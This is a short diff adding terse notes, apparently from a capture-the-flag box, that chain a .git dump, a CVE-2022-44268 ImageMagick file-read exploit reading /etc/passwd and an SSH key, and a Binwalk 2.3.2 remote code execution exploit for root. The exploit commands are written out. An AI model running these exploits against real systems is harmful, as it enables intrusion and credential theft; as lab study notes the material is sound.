@@ -1,0 +1,15 @@
+	USR
+dirb
+.git -> git-dumper -> sqlite directory
+magick (upload file) -> vulnerable version 
+CVE-2022-44268 ImageMagick Arbitrary File Read -> https://github.com/kljunowsky/CVE-2022-44268#cve-2022-44268-%EF%B8%8F
+run -> python3 CVE-2022-44268.py --image imagetopoison.png --file-to-read /etc/passwd --output poisoned.png
+afer read upload file -> python3 CVE-2022-44268.py --url <http://target/upload/fileuploaded>
+dump sqlite foundend with git dumper through upload method -> ssh key
+	ROOT
+Binwalk 2.3.2 -> https://www.exploit-db.com/exploits/51249
+		 https://onekey.com/blog/security-advisory-remote-command-execution-in-binwalk/
+python3 exploit.py <file.png> <target> <port>
+ 
+
+
